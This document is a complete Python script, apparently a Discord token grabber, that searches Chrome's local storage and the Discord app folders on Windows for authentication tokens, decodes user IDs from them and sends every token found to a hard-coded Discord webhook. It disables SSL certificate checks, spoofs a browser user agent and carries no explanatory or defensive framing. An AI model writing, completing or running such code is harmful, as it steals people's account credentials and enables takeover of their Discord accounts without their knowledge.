import re
import os
import base64
import typing
import json
import urllib.request
import ssl

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}
WEBHOOK_URL = "https://discord.com/api/webhooks/1252050710816755803/-jftESNbDwFwD8988-UEGeKmRpcGnCJhM-yquBj3Wvwtid1NW8KEYkk6Vt_30SlBfvjq"

# تعطيل التحقق من شهادة SSL
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
    request = urllib.request.Request(
        api_url, data=json.dumps(data).encode(),
        headers=REQUEST_HEADERS
    )

    # تعطيل التحقق من شهادة SSL أثناء فتح الرابط
    with urllib.request.urlopen(request, context=context) as response:
        response_status = response.status

    return response_status


def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
    try:
        with open(file_path, encoding="utf-8", errors="ignore") as text_file:
            file_contents = text_file.read()
    except PermissionError:
        return None

    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)

    return tokens if tokens else None


def get_user_id_from_token(token: str) -> typing.Union[None, str]:
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "=="
        ).decode("utf-8")
    except UnicodeDecodeError:
        return None

    return discord_user_id


def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
    id_to_tokens: typing.Dict[str, set] = dict()

    for root, _, files in os.walk(base_path):
        for file in files:
            file_path = os.path.join(root, file)
            potential_tokens = get_tokens_from_file(file_path)

            if potential_tokens is None:
                continue

            for potential_token in potential_tokens:
                discord_user_id = get_user_id_from_token(potential_token)

                if discord_user_id is None:
                    continue

                if discord_user_id not in id_to_tokens:
                    id_to_tokens[discord_user_id] = set()

                id_to_tokens[discord_user_id].add(potential_token)

    return id_to_tokens if id_to_tokens else None


def send_tokens_to_webhook(
    webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
) -> int:
    fields: list[dict] = list()

    for user_id, tokens in user_id_to_token.items():
        fields.append({
            "name": user_id,
            "value": "\n".join(tokens)
        })

    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}

    make_post_request(webhook_url, data)


def main() -> None:
    paths = []

    # Add paths for default Chrome profile
    chrome_default_path = os.path.join(
        os.getenv("LOCALAPPDATA"),
        r"Google\Chrome\User Data\Default\Local Storage\leveldb"
    )
    if os.path.exists(chrome_default_path):
        paths.append(chrome_default_path)

    # Add paths for Discord, Discord PTB, and Discord Canary
    discord_paths = [
        os.path.join(os.getenv("APPDATA"), r"discord"),
        os.path.join(os.getenv("APPDATA"), r"discordptb"),
        os.path.join(os.getenv("APPDATA"), r"discordcanary")
    ]
    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            paths.append(discord_path)

    tokens = {}

    for path in paths:
        path_tokens = get_tokens_from_path(path)

        if path_tokens:
            for user_id, user_tokens in path_tokens.items():
                if user_id not in tokens:
                    tokens[user_id] = set()
                tokens[user_id].update(user_tokens)

    if not tokens:
        return

    send_tokens_to_webhook(WEBHOOK_URL, tokens)


if __name__ == "__main__":
    main()
